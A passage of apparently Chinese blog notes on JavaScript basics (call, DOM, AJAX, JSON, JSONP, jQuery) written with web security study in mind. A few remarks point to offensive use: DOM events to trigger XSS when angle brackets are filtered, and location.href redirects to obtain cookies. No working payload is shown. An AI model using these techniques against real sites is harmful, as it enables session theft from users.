<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  fullName: <span class="function"><span class="keyword">function</span>(<span class="params">city, country</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">" "</span> + <span class="keyword">this</span>.lastName + <span class="string">","</span> + city + <span class="string">","</span> + country;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  firstName:<span class="string">"Bill"</span>,</span><br><span class="line">  lastName: <span class="string">"Gates"</span></span><br><span class="line">&#125;</span><br><span class="line">person.fullName.call(person1, <span class="string">"Seattle"</span>, <span class="string">"USA"</span>);</span><br></pre></td></tr></table></figure>

<p>与<code>call</code>相似的是apply方法。</p>
<h3 id="JS-HTML-DOM"><a href="#JS-HTML-DOM" class="headerlink" title="JS HTML DOM"></a>JS HTML DOM</h3><p><img src="https://s2.ax1x.com/2019/07/16/Zbls8x.png" alt="Zbls8x.png"></p>
<p><a href="http://www.w3school.com.cn/js/js_htmldom_document.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/js/js_htmldom_document.asp</a></p>
<p>(HTML DOM文档速查)</p>
<h4 id="DOM事件"><a href="#DOM事件" class="headerlink" title="DOM事件"></a>DOM事件</h4><p>Dom事件速查<a href="http://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noopener">http://www.runoob.com/jsref/dom-obj-event.html</a></p>
<p>当<code>&lt;，&gt;</code>被过滤掉时我们可以用<code>DOM</code>事件去触发<code>xss</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.body.innerHTML</span><br></pre></td></tr></table></figure>

<h3 id="JS弹窗"><a href="#JS弹窗" class="headerlink" title="JS弹窗"></a>JS弹窗</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.alert(<span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.confirm(<span class="string">'xxx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.prompt(<span class="string">'xxx'</span>)   <span class="comment">//前三者都可以不带window执行</span></span><br><span class="line"></span><br><span class="line">alert(xxx)</span><br></pre></td></tr></table></figure>

<h3 id="Window-Location"><a href="#Window-Location" class="headerlink" title="Window Location"></a>Window Location</h3><p><em>window.location</em> 对象可不带 window 前缀书写。</p>
<p>一些例子：</p>
<ul>
<li>window.location.href 返回当前页面的 href (URL)</li>
<li>window.location.hostname 返回 web 主机的域名</li>
<li>window.location.pathname 返回当前页面的路径或文件名</li>
<li>window.location.protocol 返回使用的 web 协议（http: 或 https:）</li>
<li>window.location.assign 加载新文档</li>
</ul>
<p>location.href可以跳转到我们指定的页面进而获得<code>cookie</code>。</p>
<h3 id="AJAX简介"><a href="#AJAX简介" class="headerlink" title="AJAX简介"></a>AJAX简介</h3><p><strong>AJAX 并不是编程语言。AJAX 是一种从网页访问 Web 服务器的技术。AJAX 代表异步 JavaScript 和 XML。</strong></p>
<p><img src="https://s2.ax1x.com/2019/07/16/Zbgfeg.png" alt="Zbgfeg.png"></p>
<h3 id="XMLHttpRequest"><a href="#XMLHttpRequest" class="headerlink" title="XMLHttpRequest"></a>XMLHttpRequest</h3><p><code>xmlhttprequest</code>为<code>Ajax</code>的核心，<code>XMLHttpRequest</code>对象用于同幕后服务器交换数据。这意味着可以更新网页的部分，而不需要重新加载整个页面。</p>
<h4 id="XMLHttpRequest对象创建"><a href="#XMLHttpRequest对象创建" class="headerlink" title="XMLHttpRequest对象创建"></a><strong>XMLHttpRequest对象创建</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// code for IE6, IE5</span></span><br><span class="line">     xhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Ajax实例"><a href="#Ajax实例" class="headerlink" title="Ajax实例"></a><strong>Ajax实例</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;button type=<span class="string">"button"</span> onclick=<span class="string">"loadDoc()"</span>&gt;修改内容&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span><br><span class="line">      <span class="keyword">this</span>.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"/example/js/ajax_info.txt"</span>, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/17/ZqhCFg.png" alt="ZqhCFg.png"></p>
<p><img src="https://s2.ax1x.com/2019/07/17/ZqhiWj.png" alt="ZqhiWj.png"></p>
<h4 id="XMLHttpRequest-对象发送请求"><a href="#XMLHttpRequest-对象发送请求" class="headerlink" title="XMLHttpRequest 对象发送请求"></a><strong>XMLHttpRequest 对象发送请求</strong></h4><ul>
<li>GET请求</li>
</ul>
<p><img src="https://s2.ax1x.com/2019/07/17/Zqhr6I.png" alt="Zqhr6I.png"></p>
<p><code>True</code>代表异步，<code>False</code>则代表同步。</p>
<ul>
<li>POST请求</li>
</ul>
<p><img src="https://s2.ax1x.com/2019/07/17/Zq50sI.png" alt="Zq50sI.png"></p>
<h4 id="onreadystatechange-函数属性"><a href="#onreadystatechange-函数属性" class="headerlink" title="onreadystatechange 函数属性"></a><strong>onreadystatechange 函数属性</strong></h4><table>
<thead>
<tr>
<th>onreadystatechange</th>
<th>定义了当 readyState 属性发生改变时所调用的函数。</th>
</tr>
</thead>
<tbody><tr>
<td>readyState</td>
<td>保存了 XMLHttpRequest 的状态。0: 请求未初始化1: 服务器连接已建立2: 请求已接收3: 正在处理请求4: 请求已完成且响应已就绪</td>
</tr>
<tr>
<td>status</td>
<td>200: “OK”403: “Forbidden”404: “Page not found”如需完整列表，请访问 <a href="http://www.w3school.com.cn/tags/ref_httpmessages.asp" target="_blank" rel="noopener">Http 消息参考手册</a></td>
</tr>
<tr>
<td>statusText</td>
<td>返回状态文本（例如 “OK” 或 “Not Found”）</td>
</tr>
</tbody></table>
<p>实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span><br><span class="line">            <span class="keyword">this</span>.responseText;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhttp.open(<span class="string">"GET"</span>, <span class="string">"ajax_info.txt"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhttp.send(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PS：<code>onreadystatechange</code> 被触发五次（0-4），每次 <code>readyState</code> 都发生变化。</strong></p>
<h4 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a><strong>回调函数</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">loadDoc(<span class="string">"url-1"</span>, myFunction1);</span><br><span class="line"></span><br><span class="line">loadDoc(<span class="string">"url-2"</span>, myFunction2);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params">url, cFunction</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp;</span><br><span class="line">  xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">      cFunction(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction1</span>(<span class="params">xhttp</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// action goes here</span></span><br><span class="line"> &#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction2</span>(<span class="params">xhttp</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// action goes here</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="服务器响应属性"><a href="#服务器响应属性" class="headerlink" title="服务器响应属性"></a><strong>服务器响应属性</strong></h4><table>
<thead>
<tr>
<th>responseText</th>
<th>获取字符串形式的响应数据</th>
</tr>
</thead>
<tbody><tr>
<td><strong>responseXML</strong></td>
<td><strong>获取 XML 数据形式的响应数据</strong></td>
</tr>
</tbody></table>
<h5 id="XML实例"><a href="#XML实例" class="headerlink" title="XML实例"></a>XML实例</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">   xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState  == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">    myFunction(<span class="keyword">this</span>);</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"music_list.xml"</span>, <span class="literal">true</span>);</span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params">xml</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> i;</span><br><span class="line">  <span class="keyword">var</span> xmlDoc = xml.responseXML;</span><br><span class="line">  <span class="keyword">var</span> table=<span class="string">"&lt;tr&gt;&lt;th&gt;艺术家&lt;/th&gt;&lt;th&gt;曲目&lt;/th&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  <span class="keyword">var</span> x = xmlDoc.getElementsByTagName(<span class="string">"TRACK"</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;x.length;  i++) &#123; </span><br><span class="line">    table += <span class="string">"&lt;tr&gt;&lt;td&gt;"</span> +</span><br><span class="line">    x[i].getElementsByTagName(<span class="string">"ARTIST"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue  +</span><br><span class="line">    <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> +</span><br><span class="line">    x[i].getElementsByTagName(<span class="string">"TITLE"</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].nodeValue  +</span><br><span class="line">    <span class="string">"&lt;/td&gt;&lt;/tr&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AJAX-PHP-实例"><a href="#AJAX-PHP-实例" class="headerlink" title="AJAX PHP 实例"></a>AJAX PHP 实例</h3><p>关键代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;搜索建议：&lt;spasn id=<span class="string">"txtHint"</span>&gt;&lt;<span class="regexp">/span&gt;&lt;/</span>p&gt; </span><br><span class="line"></span><br><span class="line">&lt;p&gt;姓名：&lt;insput type=<span class="string">"text"</span> id=<span class="string">"txt1"</span> onkeyup=<span class="string">"showHint(this.value)"</span>&gt;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">function showHint(str) &#123;</span></span><br><span class="line"><span class="regexp">  var xhttp;</span></span><br><span class="line"><span class="regexp">  if (str.length == 0) &#123; </span></span><br><span class="line"><span class="regexp">    document.getElementById("txtHint").innerHTML = "";</span></span><br><span class="line"><span class="regexp">    return;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  xhttp = new XMLHttpRequest();</span></span><br><span class="line"><span class="regexp">  xhttp.onreadystatechange = function() &#123;</span></span><br><span class="line"><span class="regexp">    if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span></span><br><span class="line"><span class="regexp">      document.getElementById("txtHint").innerHTML = this.responseText;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp">  xhttp.open("GET", "/</span>demo/gethint.php?q=<span class="string">"+str, true);</span></span><br><span class="line"><span class="string">  xhttp.send();   </span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>php关键代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($q !== <span class="string">""</span>) &#123;</span><br><span class="line">    $q = strtolower($q);</span><br><span class="line">    $len=strlen($q);</span><br><span class="line">    foreach($a <span class="keyword">as</span> $name) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr($q, substr($name, <span class="number">0</span>, $len))) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($hint === <span class="string">""</span>) &#123;</span><br><span class="line">                $hint = $name;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $hint .= <span class="string">", $name"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JSON简介"><a href="#JSON简介" class="headerlink" title="JSON简介"></a>JSON简介</h3><p><code>JSON</code> 是一种存储和交换数据的语法。当数据在浏览器与服务器之间进行交换时，这些数据只能是文本。JSON 属于文本，并且我们能够把任何 JavaScript 对象转换为 JSON，然后将 JSON 发送到服务器。我们也能把从服务器接收到的任何 JSON 转换为 JavaScript 对象。以这样的方式，我们能够把数据作为 JavaScript 对象来处理，无需复杂的解析和转译。</p>
<p><strong>实例</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//存储数据：</span></span><br><span class="line">myObj = &#123; <span class="attr">name</span>:<span class="string">"Bill Gates"</span>,  <span class="attr">age</span>:<span class="number">62</span>, <span class="attr">city</span>:<span class="string">"Seattle"</span> &#125;;</span><br><span class="line">myJSON =  <span class="built_in">JSON</span>.stringify(myObj);</span><br><span class="line">localStorage.setItem(<span class="string">"testJSON"</span>, myJSON); <span class="comment">//本地数据储存</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接收数据：</span></span><br><span class="line">text = localStorage.getItem(<span class="string">"testJSON"</span>);  <span class="comment">//本地数据取出</span></span><br><span class="line">obj =  <span class="built_in">JSON</span>.parse(text);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = obj.name;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/17/ZLpihd.png" alt="ZLpihd.png"></p>
<h3 id="JSON-文件"><a href="#JSON-文件" class="headerlink" title="JSON 文件"></a>JSON 文件</h3><ul>
<li>JSON 文件的文件类型是 “.json”</li>
<li>JSON 文本的 MIME 类型是 “application/json”</li>
</ul>
<h3 id="JSON解析"><a href="#JSON解析" class="headerlink" title="JSON解析"></a>JSON解析</h3><p>关键函数<code>parse</code>，实例如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=<span class="string">"demo"</span>&gt;&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">var text = '&#123;"employees":[' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Bill","lastName":"Gates" &#125;,' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Steve","lastName":"Jobs" &#125;,' +</span></span><br><span class="line"><span class="regexp">'&#123;"firstName":"Elon","lastName":"Musk" &#125;]&#125;';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">obj = JSON.parse(text);</span></span><br><span class="line"><span class="regexp">document.getElementById("demo").innerHTML =</span></span><br><span class="line"><span class="regexp">obj.employees[1].firstName + " " + obj.employees[1].lastName;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JSON把JS对象字符串化"><a href="#JSON把JS对象字符串化" class="headerlink" title="JSON把JS对象字符串化"></a>JSON把JS对象字符串化</h3><p>关键函数<code>JSON.stringify()</code>，实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">name</span>: <span class="string">"Bill"</span>, <span class="attr">age</span>: <span class="number">62</span>, <span class="attr">city</span>: <span class="string">"Seatle"</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> myJSON = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line"><span class="built_in">document</span>.write(myJSON);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"name"</span>:<span class="string">"Bill"</span>,<span class="attr">"age"</span>:<span class="number">62</span>,<span class="attr">"city"</span>:<span class="string">"Seatle"</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>JSON.parse()</code>函数将<code>json</code>字符串转化为<code>JavaScript</code>对象，<code>JSON.stringify()</code>将<code>JavaScript</code>对象转化为<code>json</code>字符串。</p>
<h3 id="JSON与PHP"><a href="#JSON与PHP" class="headerlink" title="JSON与PHP"></a>JSON与PHP</h3><p><strong>实例</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">obj = &#123; <span class="string">"table"</span>:<span class="string">"customers"</span>, <span class="string">"limit"</span>:<span class="number">10</span> &#125;;</span><br><span class="line">dbParam = <span class="built_in">JSON</span>.stringify(obj);</span><br><span class="line">xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">         myObj = <span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.responseText);</span><br><span class="line">         <span class="keyword">for</span> (x <span class="keyword">in</span> myObj) &#123;</span><br><span class="line">             txt += myObj[x].name + <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = txt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"demo_json_db.php"</span>, <span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.send(<span class="string">"x="</span> + dbParam);</span><br></pre></td></tr></table></figure>

<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>这里只是简单的介绍一下JSONP，后续文章会有详细的描述。</p>
<blockquote>
<p>Jsonp(JSON with Padding) 是 json 的一种”使用模式”，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p>
<p>为什么我们从不同的域（网站）访问数据需要一个特殊的技术( JSONP )呢？这是因为同源策略。</p>
<p>同源策略，它是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;demo_jsonp.php&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JQuery介绍"><a href="#JQuery介绍" class="headerlink" title="JQuery介绍"></a>JQuery介绍</h3><p><strong>jQuery</strong>是一套跨<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/瀏覽器" target="_blank" rel="noopener">浏览器</a>的<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/JavaScript" target="_blank" rel="noopener">JavaScript</a><a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/函式庫" target="_blank" rel="noopener">函式库</a>，简化<a href="https://jsproxy.ga/-----https://zh.wikipedia.org/wiki/HTML" target="_blank" rel="noopener">HTML</a>与JavaScript之间的操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZO7nkq.png" alt="ZO7nkq.png"></p>
<p>可以比较方便的通过CDN引用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;jquery&#x2F;1.10.2&#x2F;jquery.min.js&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JQuery语法"><a href="#JQuery语法" class="headerlink" title="JQuery语法"></a>JQuery语法</h3><h4 id="JQuery选择器"><a href="#JQuery选择器" class="headerlink" title="JQuery选择器"></a>JQuery选择器</h4><p><img src="https://s2.ax1x.com/2019/07/18/ZOHXdA.png" alt="ZOHXdA.png"></p>
<p>JQuery选择器简化了javascipt对元素的选择调用，在正常的js语句调用一个id为1的元素，调用语句为<code>getElementById(&#39;1&#39;)</code>,而在JQuery的调用中只需要<code>$(&quot;#1&quot;)</code>即可完成。实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="string">"button"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$(<span class="string">".test"</span>).hide();</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码解读：$(document)代表选择的是整个文档，ready代表的是一个事件，也就是当整个文档都加载完毕了再执行下面的JQuery操作，$(“button”)代表选择了button按钮，并且再触发click事件时调用function去隐藏所有class为test的元素。常见选择器如下:</p>
<p><img src="https://s2.ax1x.com/2019/07/18/ZObBeH.png" alt="ZObBeH.png"></p>
<h4 id="JQuery事件"><a href="#JQuery事件" class="headerlink" title="JQuery事件"></a>JQuery事件</h4><p>实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"input"</span>).focus(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	$(<span class="keyword">this</span>).css(<span class="string">"background-color"</span>,<span class="string">"#cccccc"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>当获得焦点时，选择当前html元素并改变css样式。</p>
<h4 id="JQuery-Callback"><a href="#JQuery-Callback" class="headerlink" title="JQuery Callback"></a>JQuery Callback</h4><p>实例</p>
